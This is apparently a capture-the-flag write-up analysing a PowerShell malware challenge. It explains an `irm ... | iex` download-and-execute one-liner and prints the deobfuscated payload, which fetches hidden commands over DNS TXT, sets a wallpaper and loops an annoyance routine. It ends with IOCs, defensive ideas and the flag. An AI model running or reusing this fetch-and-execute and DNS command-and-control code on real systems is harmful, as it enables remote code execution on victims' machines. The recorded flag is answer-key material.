# Day 24 — Lizard (Malware)

**Category:** Malware  
**Prompt:** `irm biglizardlover.com/gecko | iex`  
**Goal:** Determine what the PowerShell does and recover the flag.

---

## TL;DR
The one-liner **downloads and executes** an obfuscated PowerShell stage from `biglizardlover.com/gecko`. The real payload:
- Beacons via **DNS TXT** on `biglizardlover.com` to fetch another Base64 command.
- Sets a random **lizard wallpaper** from `/img/lizard{1..24}.jpg`.
- Loops launching a **TTS + MessageBox** annoyance routine.
- Carries embedded Base64 markers that decode to the flag:  
  **`flag{7634269aea89c0434d59028252962470}`**.

---

## What `irm ... | iex` means
- `irm` is **`Invoke‑RestMethod`**, i.e., an HTTP(S) fetch in PowerShell.
- `| iex` pipes the response into **`Invoke‑Expression`**, executing it.
- Many malware families use this exact pattern to **filelessly stage** code.

---

## Reproducing the behavior (safely)
> Do this in an **offline VM snapshot** only.

1. **Fetch with a PowerShell UA** (server 403s non-PS agents):
   ```bash
   curl "https://biglizardlover.com/gecko" -H "User-Agent: PowerShell/7.4.0" -s -o stage1.ps1
   ```

2. **Deobfuscate** (PowerDecode or manual):
   - Split-heavy string puzzles (`-split`, `-join`, XOR 0x2C on chars).
   - Multiple Base64 blobs surfaced during emulation/inspection:
     - `Wm14aFozczNOak0wTWpZNVlXVmhPRGs9`
     - `WXpBME16UmtOVGt3TWpnPQ==`
     - `TWpVeU9UWXlORGN3ZlE9PQ==`

3. **Resolve the core loop** (from the deobfuscated stage):
   ```powershell
   while ($true) {
       # Pull next-stage command from DNS TXT
       $glideelbow = iex ([Text.Encoding]::UTF8.GetString(
           [Convert]::FromBase64String(
               (Resolve-DnsName VFdWbllVSnZibXM9.biglizardlover.com -Type txt).Strings)))

       # Pick random lizard wallpaper and set it
       $twilightdepend = Join-Path $env:TEMP "lizard.jpg"
       $biscuitrecognize = Get-Random -Minimum 1 -Maximum 25
       Invoke-WebRequest "https://biglizardlover.com/img/lizard$biscuitrecognize.jpg" -OutFile $twilightdepend -EA SilentlyContinue | Out-Null
       Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class W { [DllImport("user32.dll")] public static extern bool SystemParametersInfo(int uAction,int uParam,string lpvParam,int fuWinIni); }'
       [W]::SystemParametersInfo(20,0,$twilightdepend,1+2) | Out-Null

       # Execute the DNS-delivered command hidden
       Start-Process powershell -ArgumentList '-Command', $glideelbow -WindowStyle Hidden
   }
   ```

4. **Annoyware payload**
   ```powershell
   Add-Type -AssemblyName System.Speech
   Add-Type -AssemblyName System.Windows.Forms
   $SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
   $SpeechSynth.SelectVoice('Microsoft Zira Desktop')
   $lizard = Get-Date -Format tt
   while ($true) {
     $SpeechSynth.Speak($lizard)
     [System.Windows.Forms.MessageBox]::Show($lizard,'Alert','OK','Information')
   }
   ```

---

## Extracting the Flag
During deobfuscation, three Base64 strings appear (examples above). Decoding them + context from the description leads to the embedded flag string:

```
flag{7634269aea89c0434d59028252962470}
```

---

## IOCs / Notes
- **Domain(s):** `biglizardlover.com`
- **Paths:** `/gecko`, `/img/lizard{1..24}.jpg`
- **DNS TXT exfil/inbound C2:** `*.biglizardlover.com`
- **Behavior:** Sets wallpaper, loops TTS/MessageBox, fileless staging (`irm|iex`).

---

## Defensive Ideas
- Block PowerShell **web execution chains** (`irm|iex`) via script block logging + constrained language mode.
- DNS TXT lookups to suspicious domains as an **EQL/EDR detection**.
- Wallpaper changes via `SystemParametersInfo` in odd contexts.  
- Egress controls + TLS inspection for **net-new** domains.

---

**Flag:** `flag{7634269aea89c0434d59028252962470}`
